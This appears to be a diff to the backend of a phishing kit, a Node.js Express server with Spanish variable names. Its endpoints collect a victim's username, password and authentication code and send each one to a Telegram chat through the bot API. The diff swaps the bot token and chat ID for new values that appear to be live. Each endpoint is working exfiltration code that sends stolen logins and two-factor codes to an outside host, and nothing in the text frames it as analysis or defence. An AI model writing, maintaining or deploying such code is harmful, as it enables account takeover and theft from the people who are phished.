@@ -30,10 +30,10 @@ app.post('/send-user', async (req, res) => {
     }
     usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
-    await fetch(`https://api.telegram.org/bot8018552342:AAHZ2upDtbdcwPpTbYGKlH0uGZbczo1evjA/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '7938210264',
+            chat_id: '7891046852',
             text: usuariosData[dispositivoID].usuario,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -51,10 +51,10 @@ app.post('/send-password', async (req, res) => {
         usuariosData[dispositivoID].contraseña = `Contraseña ${dispositivoID.replace('id.', '')}: \`${password}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8018552342:AAHZ2upDtbdcwPpTbYGKlH0uGZbczo1evjA/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '7938210264',
+            chat_id: '7891046852',
             text: usuariosData[dispositivoID].contraseña,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
@@ -72,10 +72,10 @@ app.post('/send-auth', async (req, res) => {
         usuariosData[dispositivoID].codigo = `Autenticación ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
-    await fetch(`https://api.telegram.org/bot8018552342:AAHZ2upDtbdcwPpTbYGKlH0uGZbczo1evjA/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
-            chat_id: '7938210264',
+            chat_id: '7891046852',
             text: usuariosData[dispositivoID].codigo,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
